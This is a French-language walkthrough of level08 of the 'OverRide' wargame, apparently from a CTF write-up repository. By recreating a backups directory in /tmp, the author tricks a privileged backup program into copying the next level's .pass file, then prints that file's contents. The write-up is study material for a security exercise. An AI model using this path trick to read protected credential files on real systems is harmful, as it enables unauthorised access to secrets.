@@ -1,0 +1,44 @@
+On remarque que le programme prend un fichier un parametre et le sauvegarde dans le fichier backups
+
+level08@OverRide:~$ ./level08 level08
+level08@OverRide:~$ cd backups
+level08@OverRide:~/backups$ ls
+level08
+
+On tente de voir ce que ca donne si on creer un fichier dans /tmp et que lon tente de le passer en param
+
+level08@OverRide:~$ cd /tmp
+level08@OverRide:/tmp$ ls
+test
+level08@OverRide:/tmp$ ~/level08 test
+ERROR: Failed to open ./backups/.log
+
+Failed to open, on va tenter de creer backups dans tmp ainsi que .logs dans /tmp/backups afin de recreer les memes conditionsmais dans un endroit ou nous avons les droits
+
+level08@OverRide:/tmp$ mkdir backups
+level08@OverRide:/tmp$ cd backups
+level08@OverRide:/tmp/backups$ touch .log
+level08@OverRide:/tmp/backups$ cd ..
+level08@OverRide:/tmp$ touch test
+level08@OverRide:/tmp$ ~/level08 test
+level08@OverRide:/tmp$ ls
+backups  test
+level08@OverRide:/tmp$ cd backups
+level08@OverRide:/tmp/backups$ ls
+test
+
+On recupere bien notre fichier test.
+Que ce passerais t il si nous envoyons .pass ?
+
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+Ca ne marche pas car nous n'avons pas repproduit les conditions comme au dessus.
+Nous devons créer le chemin dans backups pour pouvoir recevoir le .pass
+Afin de gagner du temps, on va utiliser l'option -p de mkdir qui permet aussi de creer les fichiers parents si ils n'existent pas deja.
+
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
+
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
